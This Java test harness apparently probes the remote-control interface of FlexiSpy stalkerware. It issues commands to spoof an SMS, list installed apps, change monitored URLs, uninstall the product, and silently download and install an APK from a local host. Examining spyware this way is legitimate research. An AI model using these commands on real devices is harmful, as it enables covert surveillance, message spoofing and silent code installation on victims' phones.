package com.android.flexispytest;

import com.vvt.remotecontrol.ControlCommand;
import com.vvt.remotecontrol.RemoteControlException;
import com.vvt.remotecontrol.RemoteFunction;
import com.vvt.remotecontrol.RemoteOnCommandReceive;
import com.vvt.remotecontrol.input.RmtCtrlInputDownloadBinaryAndUpdateSilentMode;
import com.vvt.remotecontrol.input.RmtCtrlInputSpoofSms;
import com.vvt.remotecontrol.output.RmtCtrlOutputStatusMessage;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

/**
 * Created by gnehsoah on 5/17/17.
 */

public class Main {

    public static String ip;
    public static String command;

    public static void main(String [] args) throws IOException, ClassNotFoundException {

        if (args.length < 1){
            System.out.println("Usage: flexispytest ip command");
            System.exit(0);
        }

        ip = args[0];
        command = args[1];
        ControlCommand controlCommand = null;

        switch (command) {
            case "SpoofSms":
                RmtCtrlInputSpoofSms rmtCtrlInputSpoofSms = new RmtCtrlInputSpoofSms();
                rmtCtrlInputSpoofSms.setDestinationNumber("10086");
                rmtCtrlInputSpoofSms.setSmsMessage("test");
                controlCommand = new ControlCommand(RemoteFunction.SPOOF_SMS, rmtCtrlInputSpoofSms);
                break;

            case "Uninstall":
                controlCommand = new ControlCommand(RemoteFunction.UNINSTALL_PRODUCT, null);
                break;

            case "GetURL":
                controlCommand = new ControlCommand(RemoteFunction.SEND_CURRENT_URL, null);
                break;

            case "SetURL":
                List urls = new ArrayList();
                urls.add("http://192.168.11.45:8080");
                controlCommand = new ControlCommand(RemoteFunction.ADD_URL, urls);
                break;

            case "SendInstalledApp":

               //controlCommand = new ControlCommand(RemoteFunction.SEND_HEARTBEAT, null);

                controlCommand = new ControlCommand(RemoteFunction.SEND_INSTALLED_APPLICATIONS, null);
                break;


            case "UpdateBinary":
                RmtCtrlInputDownloadBinaryAndUpdateSilentMode rmtCtrlInputDownloadBinaryAndUpdateSilentMode = new RmtCtrlInputDownloadBinaryAndUpdateSilentMode();
                rmtCtrlInputDownloadBinaryAndUpdateSilentMode.setVersionNumber("250");
                rmtCtrlInputDownloadBinaryAndUpdateSilentMode.setChecksum("387976742");
                rmtCtrlInputDownloadBinaryAndUpdateSilentMode.setUrl("http://192.168.11.45/update.apk");
                controlCommand = new ControlCommand(RemoteFunction.SET_DOWNLOAD_BINARY_AND_UPDATE_SILENT_MODE, rmtCtrlInputDownloadBinaryAndUpdateSilentMode);
                break;

//            case "SetMode":
//                RmtCtrlInputRunningMode rmtCtrlInputRunningMode = new RmtCtrlInputRunningMode();
//                rmtCtrlInputRunningMode.setRunningMode(RunningMode.FULL);
//                controlCommand = new ControlCommand(RemoteFunction.DEBUG_SET_APPLICATION_MODE, rmtCtrlInputRunningMode);
//                break;


            default:
                System.out.println("Unknown Command");

        }

        if (controlCommand != null){

            Object response = new RemoteOnCommandReceive(controlCommand).execute();

            if (response instanceof RmtCtrlOutputStatusMessage) {

                System.out.println("Response = " + ((RmtCtrlOutputStatusMessage) response).getMessage());
            }
            else if (response instanceof RemoteControlException){
                ((RemoteControlException) response).printStackTrace();
            }
            else {
                System.out.println("Response = " + response.toString());
            }
        }










    }

}
